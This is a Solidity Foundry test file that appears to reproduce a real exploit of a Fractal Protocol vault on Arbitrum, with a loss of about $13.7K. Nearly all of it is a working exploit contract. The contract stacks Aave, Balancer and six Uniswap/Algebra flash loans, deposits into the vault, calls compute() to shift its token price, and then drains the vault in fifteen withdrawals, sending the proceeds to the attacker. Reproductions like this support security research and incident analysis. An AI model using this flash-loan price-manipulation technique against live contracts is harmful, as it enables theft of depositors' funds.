// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : ~$13.7K
// Attacker : https://arbiscan.io/address/0xe2acec13c6d1aaca584f827a22f2e4a02131e39a
// Attack Contract : https://arbiscan.io/address/0x43514743caa5a7d4a8b07f5d25fb242391bbc8da
// Vulnerable Contract : https://arbiscan.io/address/0x80e1a981285181686a3951b05ded454734892a09
// Attack Tx : https://arbiscan.io/tx/0x20db78913a51c3b3aece860ea142c240f3f8fa3b5bbf533a3d1d48eed857e10f
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x80e1a981285181686a3951b05ded454734892a09#code
//
// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/DefimonAlerts/status/2058619391776878967

contract FractalProtocolTest is Test {
    bytes32 internal constant TX_HASH = 0x20db78913a51c3b3aece860ea142c240f3f8fa3b5bbf533a3d1d48eed857e10f;

    address internal constant ATTACKER = 0xE2AceC13c6d1AAcA584F827a22F2e4A02131e39a;
    address internal constant FRACTAL_VAULT = 0x80e1a981285181686a3951B05dEd454734892a09;
    address internal constant USDF = 0xae48b7C8e096896E32D53F10d0Bf89f82ec7b987;
    IERC20 internal constant USDC_E = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    uint256 internal constant EXPECTED_PROFIT = 13_707_715_574;

    FractalProtocolExploit internal exploit;

    function setUp() public {
        vm.createSelectFork("arbitrum", TX_HASH);
        exploit = new FractalProtocolExploit(ATTACKER);

        vm.label(ATTACKER, "Attacker");
        vm.label(address(exploit), "Exploit Contract");
        vm.label(FRACTAL_VAULT, "Fractal Vault");
        vm.label(USDF, "USDF");
        vm.label(address(USDC_E), "USDC.e");
    }

    function testExploit() public {
        uint256 beforeUsdc = USDC_E.balanceOf(ATTACKER);

        vm.prank(ATTACKER, ATTACKER);
        exploit.attack(FRACTAL_VAULT, USDF);

        uint256 usdcProfit = USDC_E.balanceOf(ATTACKER) - beforeUsdc;
        assertEq(usdcProfit, EXPECTED_PROFIT, "USDC.e profit mismatch");

        console.log("Stolen USDC.e", usdcProfit);
    }
}

contract FractalProtocolExploit {
    IFractalAaveV3Pool internal constant AAVE_V3_POOL = IFractalAaveV3Pool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IFractalBalancerVault internal constant BALANCER_VAULT = IFractalBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 internal constant USDC_E = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    IFractalUniswapV3Pool internal constant POOL_WETH_USDCE_500 =
        IFractalUniswapV3Pool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IFractalUniswapV3Pool internal constant POOL_USDC_USDCE_100 =
        IFractalUniswapV3Pool(0x8e295789c9465487074a65b1ae9Ce0351172393f);
    IFractalUniswapV3Pool internal constant POOL_USDT_USDCE_500 =
        IFractalUniswapV3Pool(0x13398E27a21Be1218b6900cbEDF677571df42A48);
    IFractalUniswapV3Pool internal constant POOL_DAI_USDCE_500 =
        IFractalUniswapV3Pool(0xd37Af656Abf91c7f548FfFC0133175b5e4d3d5e6);
    IFractalUniswapV3Pool internal constant POOL_DAI_USDCE_100 =
        IFractalUniswapV3Pool(0xF0428617433652c9dc6D1093A42AdFbF30D29f74);
    IFractalUniswapV3Pool internal constant POOL_USDC_USDCE_100_ALT =
        IFractalUniswapV3Pool(0xc86Eb7B85807020b4548EE05B54bfC956eEbbfCD);

    uint256 internal constant AAVE_AMOUNT = 222_454_290_194;
    uint256 internal constant BALANCER_AMOUNT = 156_746_742_625;
    uint256 internal constant FLASH_0_AMOUNT = 325_455_260_363;
    uint256 internal constant FLASH_1_AMOUNT = 72_877_030_712;
    uint256 internal constant FLASH_2_AMOUNT = 16_812_367_950;
    uint256 internal constant FLASH_3_AMOUNT = 27_597_033_991;
    uint256 internal constant FLASH_4_AMOUNT = 34_922_809_708;
    uint256 internal constant FLASH_5_AMOUNT = 546_394_022_415;

    uint256 internal constant DEPOSIT_AMOUNT = 1_403_259_557_958;

    address internal immutable owner;
    IFractalVault internal vault;
    IERC20 internal usdf;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack(address vault_, address usdf_) external {
        require(msg.sender == owner, "not owner");
        vault = IFractalVault(vault_);
        usdf = IERC20(usdf_);

        AAVE_V3_POOL.flashLoanSimple(address(this), address(USDC_E), AAVE_AMOUNT, "", 0);

        uint256 profit = USDC_E.balanceOf(address(this));
        require(USDC_E.transfer(owner, profit), "profit transfer failed");
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == address(AAVE_V3_POOL), "not aave");
        require(initiator == address(this), "bad initiator");
        require(asset == address(USDC_E), "bad asset");

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = USDC_E;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BALANCER_AMOUNT;
        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, "");

        require(USDC_E.approve(address(AAVE_V3_POOL), amount + premium), "aave approve failed");
        return true;
    }

    function receiveFlashLoan(
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not balancer");
        require(address(tokens[0]) == address(USDC_E), "bad balancer token");

        POOL_WETH_USDCE_500.flash(address(this), 0, FLASH_0_AMOUNT, "");
        require(USDC_E.transfer(address(BALANCER_VAULT), amounts[0] + feeAmounts[0]), "balancer repay failed");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(fee0 == 0, "unexpected token0 fee");

        if (msg.sender == address(POOL_WETH_USDCE_500)) {
            POOL_USDC_USDCE_100.flash(address(this), 0, FLASH_1_AMOUNT, "");
        } else if (msg.sender == address(POOL_USDC_USDCE_100)) {
            POOL_USDT_USDCE_500.flash(address(this), 0, FLASH_2_AMOUNT, "");
        } else if (msg.sender == address(POOL_USDT_USDCE_500)) {
            POOL_DAI_USDCE_500.flash(address(this), 0, FLASH_3_AMOUNT, "");
        } else if (msg.sender == address(POOL_DAI_USDCE_500)) {
            POOL_DAI_USDCE_100.flash(address(this), 0, FLASH_4_AMOUNT, "");
        } else if (msg.sender == address(POOL_DAI_USDCE_100)) {
            POOL_USDC_USDCE_100_ALT.flash(address(this), 0, FLASH_5_AMOUNT, "");
        } else {
            revert("unknown pool");
        }

        require(USDC_E.transfer(msg.sender, _flashAmount(msg.sender) + fee1), "pool repay failed");
    }

    function algebraFlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(msg.sender == address(POOL_USDC_USDCE_100_ALT), "not algebra pool");
        require(fee0 == 0, "unexpected token0 fee");

        _drainFractalVault();

        require(USDC_E.transfer(msg.sender, FLASH_5_AMOUNT + fee1), "algebra repay failed");
    }

    function _drainFractalVault() internal {
        vault.currentPeriod();
        vault.getPeriodOfCurrentEpoch();
        USDC_E.balanceOf(address(vault));
        USDC_E.balanceOf(address(this));

        require(USDC_E.approve(address(vault), DEPOSIT_AMOUNT), "vault approve failed");
        vault.deposit(DEPOSIT_AMOUNT);

        vault.currentPeriod();
        vault.compute();
        vault.currentPeriod();
        vault.compute();
        vault.currentPeriod();
        vault.getTokenPrice();

        uint256[15] memory withdrawals = [
            uint256(232_645_092_654),
            uint256(186_116_074_124),
            uint256(148_892_859_299),
            uint256(119_114_287_439),
            uint256(95_291_429_951),
            uint256(76_233_143_961),
            uint256(60_986_515_170),
            uint256(48_789_212_136),
            uint256(39_031_369_709),
            uint256(31_225_095_767),
            uint256(24_980_076_613),
            uint256(19_984_061_291),
            uint256(15_987_249_033),
            uint256(12_789_799_226),
            uint256(3_265_096_440)
        ];

        for (uint256 i; i < withdrawals.length; ++i) {
            vault.getMaxWithdrawalAmount();
            USDC_E.balanceOf(address(vault));
            usdf.balanceOf(address(this));
            vault.withdraw(withdrawals[i]);
        }
    }

    function _flashAmount(address pool) internal pure returns (uint256) {
        if (pool == address(POOL_WETH_USDCE_500)) return FLASH_0_AMOUNT;
        if (pool == address(POOL_USDC_USDCE_100)) return FLASH_1_AMOUNT;
        if (pool == address(POOL_USDT_USDCE_500)) return FLASH_2_AMOUNT;
        if (pool == address(POOL_DAI_USDCE_500)) return FLASH_3_AMOUNT;
        if (pool == address(POOL_DAI_USDCE_100)) return FLASH_4_AMOUNT;
        revert("unknown amount");
    }
}

interface IFractalAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFractalBalancerVault {
    function flashLoan(address recipient, IERC20[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IFractalUniswapV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IFractalVault {
    function currentPeriod() external view returns (uint256);
    function getPeriodOfCurrentEpoch() external view returns (uint256);
    function getTokenPrice() external view returns (uint256);
    function getMaxWithdrawalAmount() external view returns (uint256);
    function compute() external;
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}